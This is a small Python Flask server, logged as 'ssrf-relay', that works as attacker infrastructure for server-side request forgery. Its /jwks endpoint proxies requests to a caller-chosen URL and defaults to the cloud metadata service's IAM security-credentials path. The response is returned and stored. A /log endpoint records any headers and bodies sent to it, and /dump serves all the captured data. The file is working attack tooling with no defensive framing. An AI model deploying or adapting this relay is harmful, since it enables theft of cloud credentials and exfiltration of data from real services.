from flask import Flask, redirect, request, jsonify
import logging
import time
import json
import os
import requests

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("ssrf-relay")

received = []

@app.route("/", methods=["GET","POST","PUT"])
def index():
    return "alive"

@app.route("/jwks", methods=["GET"])
def jwks_proxy():
    target = request.args.get("t", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    log.info(f"=== JWKS PROXY HIT from {request.remote_addr} ===")
    log.info(f"Target: {target}")

    entry = {
        "time": time.time(),
        "path": "/jwks",
        "from": request.remote_addr,
        "headers": dict(request.headers),
        "target": target
    }
    received.append(entry)

    try:
        proxy_resp = requests.get(target, timeout=10, headers={"Accept": "*/*"})
        log.info(f"Proxy response: {proxy_resp.status_code}")
        entry["proxy_response"] = {
            "status": proxy_resp.status_code,
            "body": proxy_resp.text[:5000]
        }
        return proxy_resp.text, proxy_resp.status_code, {
            "Content-Type": proxy_resp.headers.get("Content-Type", "text/plain")
        }
    except Exception as e:
        log.error(f"Proxy failed: {e}")
        entry["proxy_error"] = str(e)
        return jsonify({"error": str(e)}), 500

@app.route("/log", methods=["GET","POST","PUT"])
@app.route("/log/<path:p>", methods=["GET","POST","PUT"])
def log_all(p=""):
    body = request.get_data(as_text=True)
    entry = {
        "time": time.time(),
        "path": f"/log/{p}",
        "method": request.method,
        "from": request.remote_addr,
        "headers": dict(request.headers),
        "body": body[:5000] if body else None
    }
    received.append(entry)
    return "ok"

@app.route("/dump")
def dump():
    return jsonify(received)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
